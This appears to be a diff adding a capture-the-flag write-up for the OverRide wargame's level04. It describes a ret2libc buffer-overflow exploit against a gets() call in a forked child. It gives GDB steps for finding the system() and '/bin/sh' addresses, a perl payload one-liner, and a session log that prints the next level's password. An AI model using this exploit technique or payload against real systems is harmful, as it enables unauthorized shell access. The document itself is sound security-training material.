@@ -1,0 +1,41 @@
+1. This program create a child process and wait for a state change of it. The child process displays a message "Give me some shellcode, k" and call gets with a buffer in its stackframe.
+2. When the child process receive input, it ends. The parent process stop to wait and print "child is exiting...".
+3. So the goal here is to exploit the child process to get a shell as gets is vulnerable to buffer overflow.
+4. We built a first exploit that execute execve('/bin/sh') from a shellcode with a bufferoverflow but at the moment the process executes the exec function, the parent display a message "no exec() for you" and kill the child.
+5. We then understood that the parent process monitor change state if the child process was replaced by execve.
+6. So we had to choose another technique to get a shell.
+7. We a Ret2Libc, this way call the system() function rather than replacing the process. So it cannot be monitored by the parent process.
+8. Here are the steps to create a ret2libc exploit :
+	a. Get the address of the string '/bin/sh' commonly present in the binary with these GDB commands :
+		I. Open GDB -> gdb ./level04
+		II. Set a breakpoint -> b main
+		III. Run the program -> r
+		IV. Print the map range of the libc -> i proc map
+		V. find in this range -> find 0xf7e2c000, 0xf7fcc000,"/bin/sh"
+		VI. We find : 0xf7f897ec or ec97f8f7 in little endian
+	b. Get the address of the system function in the libc with those commands : 
+		I. Open GDB -> gdb ./level04
+		II. Set a breakpoint -> b main
+		III. Run the program -> r
+		IV. Print the address of system -> p system
+		V. We find 0xf7e6aed0 or d0aee6f7 in little endian
+	c. By analysing the binary, we deduct that we have 156 bytes of padding before replacing the EIP
+	d. Now we are ready to build our exploit.
+	e. (perl -e 'print "1"x156 . "\xd0\xae\xe6\xf7" . "OSEF" . "\xec\x97\xf8\xf7" . "\n"'; cat -) | ./level04
+		I. We have first the padding of 156 time the '1' char to start the overflow
+		II. Secondly we have the address of system that will be executed at the end of the main function of the child process
+		III. OSEF if 4 padding random bytes
+		IV. Next we have the address of the string /bin/sh that will be used as parameter of the system function
+		V. And finally we have a newline char to stop the stdin reading of gets
+9. Here is the demonstration of the running exploit :
+
+level04@OverRide:~$ (perl -e 'print "1"x156 . "\xd0\xae\xe6\xf7" . "OSEF" . "\xec\x97\xf8\xf7" . "\n"'; cat -) | ./level04
+Give me some shellcode, k
+whoami
+level05
+cat ~level05/.pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+echo yey
+yey
+
+10. GG
